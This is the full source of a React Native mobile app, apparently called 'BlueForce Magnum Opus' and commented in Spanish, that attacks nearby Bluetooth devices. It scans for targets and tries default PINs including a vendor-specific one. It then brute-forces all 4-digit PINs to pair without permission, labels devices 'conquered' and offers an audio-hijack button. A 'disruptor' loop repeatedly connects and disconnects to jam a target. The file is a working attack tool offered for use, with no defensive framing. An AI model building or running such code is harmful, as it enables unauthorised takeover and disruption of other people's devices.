import React, { useState, useEffect } from 'react';
import { 
  StyleSheet, 
  Text, 
  View, 
  TouchableOpacity, 
  ScrollView, 
  Alert, 
  PermissionsAndroid, 
  Platform, 
  FlatList, 
  ActivityIndicator, 
  Modal, 
  TextInput 
} from 'react-native';
import RNBluetoothClassic from 'react-native-bluetooth-classic';

/**
 * BLUEFORCE MAGNUM OPUS - UNIVERSAL ADAPTIVE SUITE
 * Versión Final Certificada de Alto Rendimiento
 */

// 1. COMPONENTE: Radar de Proximidad (RSSI)
const SignalMeter = ({ rssi }) => {
  let levels = 0;
  if (rssi > -50) levels = 5;
  else if (rssi > -65) levels = 4;
  else if (rssi > -75) levels = 3;
  else if (rssi > -85) levels = 2;
  else if (rssi > -100) levels = 1;

  const color = levels >= 4 ? '#00ff88' : levels === 3 ? '#ffea00' : '#ff3c00';

  return (
    <View style={styles.meterBox}>
      {[1, 2, 3, 4, 5].map(b => (
        <View 
          key={b} 
          style={[styles.meterBar, { 
            height: b * 3, 
            backgroundColor: b <= levels ? color : '#222',
            opacity: b <= levels ? 1 : 0.2
          }]} 
        />
      ))}
    </View>
  );
};

export default function App() {
  const [discoveredDevices, setDiscoveredDevices] = useState([]);
  const [history, setHistory] = useState({});
  const [aliases, setAliases] = useState({});
  const [mode, setMode] = useState('IDLE');
  const [scriptStatus, setScriptStatus] = useState('ESPERANDO');
  const [currentPin, setCurrentPin] = useState('0000');
  const [disruptCount, setDisruptCount] = useState(0);
  const [isScanning, setIsScanning] = useState(false);
  const [logs, setLogs] = useState([]);

  // MODAL STATES
  const [modalVisible, setModalVisible] = useState(false);
  const [tempName, setTempName] = useState('');
  const [renamingAddr, setRenamingAddr] = useState('');

  const addLog = (msg) => {
    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev].slice(0, 50));
  };

  useEffect(() => {
    (async () => {
      if (Platform.OS === 'android') {
        await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_SCAN,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
          PermissionsAndroid.PERMISSIONS.BLUETOOTH_ADVERTISE
        ]);
        addLog("🦾 SISTEMA MAGNUM OPUS ARMADO.");
      }
    })();
  }, []);

  const scan = async () => {
    if (isScanning || mode !== 'IDLE') return;
    setIsScanning(true);
    setDiscoveredDevices([]);
    addLog("📡 Iniciando barrido de frecuencias...");
    try {
      const devices = await RNBluetoothClassic.startDiscovery();
      setDiscoveredDevices(devices.sort((a,b) => b.rssi - a.rssi));
      addLog(`🔍 Encontrados ${devices.length} objetivos en rango.`);
    } catch (e) {
      addLog("❌ Error: Chip Bluetooth ocupado.");
    } finally {
      setIsScanning(false);
    }
  };

  const openRename = (addr, name) => {
    setRenamingAddr(addr);
    setTempName(name);
    setModalVisible(true);
  };

  const runAdaptiveAttack = async (device) => {
    setMode('EXECUTING_SCRIPTS');
    await RNBluetoothClassic.cancelDiscovery();
    addLog(`🕵️ Iniciando Scripts Adaptativos contra ${device.address}`);

    // FASE 1: SCRIPTS RÁPIDOS
    const SCRIPTS = [
        { n: "GHOST", p: {}, d: "Sin PIN (Just Works)" },
        { n: "LEGACY_1", p: { pin: "0000" }, d: "Universal 0000" },
        { n: "LEGACY_2", p: { pin: "1234" }, d: "Universal 1234" },
        { n: "MODERN", p: { pin: "000000" }, d: "6-Digits Modern" },
        { n: "VENDOR_JBL", p: { pin: "8888" }, d: "PartyBox Master" }
    ];

    for (let s of SCRIPTS) {
        if (mode !== 'IDLE' && mode !== 'EXECUTING_SCRIPTS') break;
        setScriptStatus(`SCRIPT: ${s.n}`);
        addLog(`🧪 Probando ${s.d}...`);
        const ok = await tryPairAttempt(device.address, s.p, s.n);
        if (ok) return;
    }

    // FASE 2: BRUTA SECUENCIAL
    setMode('BRUTE_FORCE');
    addLog("⚠️ Scripts fallidos. Lanzando Fuerza Bruta Total...");
    for (let i = 0; i <= 9999; i++) {
        let curMode; setMode(m => { curMode = m; return m; });
        if (curMode !== 'BRUTE_FORCE') break;

        const pin = i.toString().padStart(4, '0');
        setCurrentPin(pin);
        const ok = await tryPairAttempt(device.address, { pin }, "BRUTE");
        if (ok) return;

        if (i > 0 && i % 10 === 0) await new Promise(r => setTimeout(r, 2000));
    }

    setMode('IDLE');
  };

  const tryPairAttempt = async (addr, payload, scriptName) => {
    try {
        await Promise.race([
            RNBluetoothClassic.pairDevice(addr, payload),
            new Promise(r => setTimeout(r, 1200))
        ]);
        await new Promise(r => setTimeout(r, 500));
        const bonded = await RNBluetoothClassic.getBondedDevices();
        if (bonded.some(d => d.address === addr)) {
            setHistory(p => ({ ...p, [addr]: { status: '🔓 CONQUISTADO', method: scriptName } }));
            setMode('IDLE');
            Alert.alert("ÉXITO", `DISPOSITIVO DOMINADO MEDIANTE ${scriptName}`);
            return true;
        }
    } catch (e) {
        await new Promise(r => setTimeout(r, 300));
    }
    return false;
  };

  const startDisruptor = async (device) => {
    setMode('DISRUPTOR');
    setDisruptCount(0);
    addLog(`🔥 BOMBARDEO ACTIVADO: ${device.address}`);
    await RNBluetoothClassic.cancelDiscovery();
    
    let count = 0;
    while (true) {
        let curMode; setMode(m => { curMode = m; return m; });
        if (curMode !== 'DISRUPTOR') break;
        
        count++;
        setDisruptCount(count);
        try {
            await Promise.race([
                RNBluetoothClassic.connectDevice(device.address),
                new Promise(r => setTimeout(r, 600))
            ]);
            RNBluetoothClassic.startDiscovery();
            await RNBluetoothClassic.disconnectDevice(device.address);
        } catch (e) {}
    }
    setMode('IDLE');
  };

  const renderDevice = ({ item }) => {
    const h = history[item.address] || { status: '⚪ NUEVO' };
    const name = aliases[item.address] || item.name || "N/A";
    const isConquered = h.status.includes('🔓');
    const isAnyActive = mode !== 'IDLE';

    return (
      <View style={styles.card}>
        <SignalMeter rssi={item.rssi} />
        <TouchableOpacity 
          style={{ flex: 1, marginLeft: 15 }} 
          onPress={() => openRename(item.address, name)}
        >
          <Text style={styles.nameText}>{name}</Text>
          <Text style={styles.macText}>{item.address} | {h.status}</Text>
        </TouchableOpacity>
        <View style={{ flexDirection: 'row' }}>
          {isConquered ? (
            <TouchableOpacity 
              style={styles.audBtn} 
              onPress={() => RNBluetoothClassic.connectDevice(item.address)}
            >
              <Text style={styles.audBtnText}>AUDIO</Text>
            </TouchableOpacity>
          ) : (
            <>
              <TouchableOpacity 
                style={[styles.atkBtn, { opacity: isAnyActive ? 0.3 : 1 }]} 
                onPress={() => runAdaptiveAttack(item)}
                disabled={isAnyActive}
              >
                <Text style={styles.atkBtnText}>ATK</Text>
              </TouchableOpacity>
              <TouchableOpacity 
                style={[styles.bugBtn, { opacity: isAnyActive ? 0.3 : 1 }]} 
                onPress={() => startDisruptor(item)}
                disabled={isAnyActive}
              >
                <Text style={styles.atkBtnText}>!BUG</Text>
              </TouchableOpacity>
            </>
          )}
        </View>
      </View>
    );
  };

  return (
    <View style={styles.container}>
      <Text style={styles.header}>BlueForce Magnum Opus</Text>
      
      {/* MODAL DE ALIAS */}
      <Modal visible={modalVisible} transparent={true} animationType="slide">
        <View style={styles.modalBg}><View style={styles.modalBody}>
            <Text style={styles.modalHeader}>ESTABLECER ALIAS TÁCTICO</Text>
            <TextInput 
              style={styles.modalInput} 
              value={tempName} 
              onChangeText={setTempName} 
              placeholder="Nombre del objetivo..." 
              placeholderTextColor="#555"
            />
            <TouchableOpacity 
              style={styles.modalSave} 
              onPress={() => { if(tempName) setAliases(p => ({ ...p, [renamingAddr]: tempName.toUpperCase() })); setModalVisible(false); }}
            >
              <Text style={{fontWeight:'bold'}}>GUARDAR</Text>
            </TouchableOpacity>
            <TouchableOpacity style={{marginTop:15}} onPress={()=>setModalVisible(false)}>
              <Text style={{color:'#444', textAlign:'center'}}>CANCELAR</Text>
            </TouchableOpacity>
        </View></View>
      </Modal>

      {/* PANEL DE CONTROL CENTRAL */}
      <View style={[styles.controlHub, mode !== 'IDLE' && { borderColor: '#ff0033' }]}>
        <Text style={styles.hudLabel}>OPERATING MODE: {mode}</Text>
        <Text style={styles.hudDisplay}>
          {mode === 'IDLE' ? 'READY' : mode === 'DISRUPTOR' ? `JAM:${disruptCount}` : mode === 'EXECUTING_SCRIPTS' ? scriptStatus : currentPin}
        </Text>
        <TouchableOpacity style={styles.scanAction} onPress={scan} disabled={mode !== 'IDLE'}>
          {isScanning ? <ActivityIndicator color="#000" /> : <Text style={{fontWeight:'bold'}}>BARRIDO DE ENTORNOS</Text>}
        </TouchableOpacity>
      </View>

      <FlatList 
        data={discoveredDevices} 
        renderItem={renderDevice} 
        keyExtractor={i => i.address} 
        style={{ flex: 1 }} 
      />

      {mode !== 'IDLE' && (
        <TouchableOpacity style={styles.abortBtn} onPress={() => setMode('IDLE')}>
          <Text style={{color:'#fff', fontWeight:'bold'}}>ABORTAR MISIÓN</Text>
        </TouchableOpacity>
      )}

      <ScrollView style={styles.logArea}>
        {logs.map((l, i) => <Text key={i} style={styles.logLine}>{l}</Text>)}
      </ScrollView>
    </View>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000', padding: 20, paddingTop: 40 },
  header: { color: '#00f2ff', fontSize: 20, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
  controlHub: { backgroundColor: '#0a0d14', padding: 25, borderRadius: 20, marginBottom: 20, borderWith: 1, borderColor: '#111' },
  hudLabel: { color: '#333', fontSize: 9, textAlign: 'center', letterSpacing: 2 },
  hudDisplay: { color: '#fff', fontSize: 32, fontWeight: 'bold', textAlign: 'center', marginVertical: 15, fontFamily: 'monospace' },
  scanAction: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 12, alignItems: 'center' },
  card: { backgroundColor: '#11151f', padding: 15, borderRadius: 15, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
  nameText: { color: '#fff', fontWeight: 'bold', fontSize: 13, textTransform: 'uppercase' },
  macText: { color: '#444', fontSize: 9 },
  meterBox: { flexDirection: 'row', alignItems: 'flex-end', width: 25 },
  meterBar: { width: 3, marginRight: 2, borderRadius: 1 },
  atkBtn: { backgroundColor: '#1a1f2e', padding: 12, borderRadius: 10 },
  bugBtn: { backgroundColor: '#ff0033', padding: 12, borderRadius: 10, marginLeft: 6 },
  audBtn: { backgroundColor: '#00ff88', padding: 12, borderRadius: 10 },
  atkBtnText: { color: '#fff', fontSize: 10, fontWeight: 'bold' },
  audBtnText: { color: '#000', fontSize: 10, fontWeight: 'bold' },
  logArea: { height: 100, backgroundColor: '#050505', padding: 10, borderRadius: 12, marginTop: 10 },
  logLine: { color: '#222', fontSize: 8, marginBottom: 2 },
  abortBtn: { backgroundColor: '#ff0033', padding: 18, borderRadius: 15, alignItems: 'center' },
  modalBg: { flex: 1, backgroundColor: 'rgba(0,0,0,0.9)', justifyContent: 'center', alignItems: 'center' },
  modalBody: { backgroundColor: '#111', padding: 30, borderRadius: 25, width: '90%', borderWith: 1, borderColor: '#222' },
  modalHeader: { color: '#00f2ff', fontWeight: 'bold', marginBottom: 20, textAlign: 'center' },
  modalInput: { backgroundColor: '#1a1a1a', color: '#fff', padding: 15, borderRadius: 15, marginBottom: 20 },
  modalSave: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 15, alignItems: 'center' }
});
